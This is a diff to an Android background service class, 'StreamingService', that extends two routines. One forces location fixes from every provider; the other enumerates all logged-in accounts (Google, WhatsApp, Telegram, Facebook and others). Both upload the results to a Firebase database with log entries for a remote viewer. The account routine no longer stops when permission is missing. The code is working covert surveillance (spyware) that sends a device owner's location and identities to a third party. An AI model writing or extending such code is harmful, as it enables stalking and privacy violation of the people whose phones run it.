@@ -960,23 +960,73 @@ class StreamingService : Service() {
 
     private fun forceLocationUpdate() {
         try {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
-            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val provider = if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
-            val loc = locManager.getLastKnownLocation(provider)
-            if (loc != null) {
+            val hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+            val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+            if (!hasFine && !hasCoarse) return
+
+            val locManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
+            
+            // 1. Check all available providers for last known location
+            val providers = locManager.getProviders(true)
+            var bestLoc: Location? = null
+            for (p in providers) {
+                try {
+                    val l = locManager.getLastKnownLocation(p)
+                    if (l != null && (bestLoc == null || l.accuracy < bestLoc.accuracy || l.time > bestLoc.time)) {
+                        bestLoc = l
+                    }
+                } catch (e: SecurityException) {}
+            }
+
+            if (bestLoc != null) {
                 deviceRef?.child("location")?.setValue(mapOf(
-                    "lat" to loc.latitude,
-                    "lng" to loc.longitude,
-                    "accuracy" to loc.accuracy,
-                    "altitude" to loc.altitude,
-                    "speed" to loc.speed,
-                    "time" to loc.time
+                    "lat" to bestLoc.latitude,
+                    "lng" to bestLoc.longitude,
+                    "accuracy" to bestLoc.accuracy,
+                    "altitude" to bestLoc.altitude,
+                    "speed" to bestLoc.speed,
+                    "time" to bestLoc.time
                 ))
                 deviceRef?.child("logs")?.push()?.setValue(mapOf(
-                    "log" to "📍 [GPS LOCATION] Lat: ${loc.latitude}, Lng: ${loc.longitude}",
+                    "log" to "📍 [GPS LOCATION] Lat: ${bestLoc.latitude}, Lng: ${bestLoc.longitude} (Acc: ${bestLoc.accuracy}m)",
                     "time" to ServerValue.TIMESTAMP
                 ))
+            }
+
+            // 2. Request a fresh single location update on main thread from available providers
+            mainHandler.post {
+                try {
+                    val freshListener = object : LocationListener {
+                        override fun onLocationChanged(l: Location) {
+                            try {
+                                deviceRef?.child("location")?.setValue(mapOf(
+                                    "lat" to l.latitude,
+                                    "lng" to l.longitude,
+                                    "accuracy" to l.accuracy,
+                                    "altitude" to l.altitude,
+                                    "speed" to l.speed,
+                                    "time" to l.time
+                                ))
+                                locManager.removeUpdates(this)
+                            } catch (e: Exception) {}
+                        }
+                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                        override fun onProviderEnabled(provider: String) {}
+                        override fun onProviderDisabled(provider: String) {}
+                    }
+
+                    if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                        locManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, freshListener, Looper.getMainLooper())
+                    }
+                    if (locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                        locManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, freshListener, Looper.getMainLooper())
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && locManager.isProviderEnabled(LocationManager.FUSED_PROVIDER)) {
+                        locManager.requestSingleUpdate(LocationManager.FUSED_PROVIDER, freshListener, Looper.getMainLooper())
+                    }
+                } catch (e: Exception) {
+                    Timber.e(e, "Error requesting fresh location updates")
+                }
             }
         } catch (e: Exception) {
             Timber.e(e, "Error forcing location update")
@@ -1068,17 +1118,56 @@ class StreamingService : Service() {
 
     private fun exportAccountsToFirebase() {
         try {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
-                return
-            }
+            val hasAccountsPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
             val am = AccountManager.get(this)
-            val accounts = am.accounts
             val accountsList = mutableListOf<Map<String, String>>()
-            for (acc in accounts) {
-                accountsList.add(mapOf("type" to acc.type, "name" to acc.name))
+            
+            try {
+                // Get all accounts
+                val accounts = am.accounts
+                for (acc in accounts) {
+                    val readableType = when {
+                        acc.type.contains("google", ignoreCase = true) -> "Google"
+                        acc.type.contains("whatsapp", ignoreCase = true) -> "WhatsApp"
+                        acc.type.contains("telegram", ignoreCase = true) -> "Telegram"
+                        acc.type.contains("facebook", ignoreCase = true) || acc.type.contains("messenger", ignoreCase = true) -> "Facebook"
+                        acc.type.contains("imo", ignoreCase = true) -> "IMO"
+                        acc.type.contains("viber", ignoreCase = true) -> "Viber"
+                        acc.type.contains("skype", ignoreCase = true) -> "Skype"
+                        acc.type.contains("samsung", ignoreCase = true) -> "Samsung"
+                        acc.type.contains("xiaomi", ignoreCase = true) -> "Xiaomi"
+                        else -> acc.type.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: acc.type
+                    }
+                    accountsList.add(mapOf("type" to readableType, "name" to acc.name, "rawType" to acc.type))
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "Error fetching am.accounts")
             }
-            // Write to Firebase so the website can display it
+
+            // Also check specific authenticators for installed apps
+            try {
+                val authenticators = am.authenticatorTypes
+                for (auth in authenticators) {
+                    try {
+                        val authAccounts = am.getAccountsByType(auth.type)
+                        for (acc in authAccounts) {
+                            if (accountsList.none { it["name"] == acc.name && it["rawType"] == acc.type }) {
+                                val readableType = auth.type.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: auth.type
+                                accountsList.add(mapOf("type" to readableType, "name" to acc.name, "rawType" to acc.type))
+                            }
+                        }
+                    } catch (e: Exception) {}
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "Error fetching authenticators")
+            }
+
+            // Write to Firebase
             deviceRef?.child("accounts")?.setValue(accountsList)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "👤 [ACCOUNTS SYNCED] Found ${accountsList.size} logged-in accounts",
+                "time" to ServerValue.TIMESTAMP
+            ))
         } catch (e: Exception) { 
             Timber.e(e, "Accounts Error: ${e.message}") 
         }
